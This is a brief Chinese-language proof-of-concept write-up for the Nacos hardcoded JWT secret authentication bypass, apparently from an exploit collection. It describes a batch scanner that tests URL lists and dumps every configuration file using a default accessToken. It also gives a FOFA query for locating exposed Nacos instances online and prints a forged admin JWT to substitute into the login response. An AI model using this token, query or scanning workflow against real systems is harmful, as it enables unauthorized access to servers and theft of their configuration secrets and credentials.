# Nacos JWT 硬编码登陆

# 0x0x 梭哈

[nacosScan.py](/pochub/nacos/nacosScan.py ':ignore')

do what?

- [x] 读取 url.txt 文件，批量验证 Nacos JWT 漏洞
  - [x] 支持url，或者直接输入 host、ip 重定向

- [x] 获取全部配置文件信息，存储在 output 目录中
  - [x] 使用默认 accessToken，可 -t 修改
- [x] 解析配置文件的轮子
  - [x] 提取期望 key，新增直接添加到 niceKey 数组
    - [x] 解析 yaml、yml 文件
    - [ ] json、 properties、无后缀的遇到再加，目前简单处理

效果图

![image-20230531231729266](attachments/image-20230531231729266.png)

# 0x00 概述

## 漏洞描述

Nacos 提供了一组简单易用的特性集，帮助您快速实现动态服务发现、服务配置、服务元数据及流量管理。若您Nacos未修改 secret.key，则攻击者可利用默认secret.key生成JWT Token，从而造成权限绕过访问到相关API接口。

## 影响范围

0.1.0<=com.alibaba.nacos:nacos-console<2.2.0.1

# 0x01 环境

fofa

```
app="NACOS" 
```

# 0x02 复现

抓取登陆包，修改响应包状态码和 body

```json
{
"accessToken":
"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3NTA4Mzg3N30.mIjNX6MXNF3FgQNTl-FduWpsaTSZrOQZxTCu7Tg46ZU","tokenTtl": 18000,
"globalAdmin": true,"username":"nacos"
}
```

![image-20230530101351383](attachments/image-20230530101351383.png)









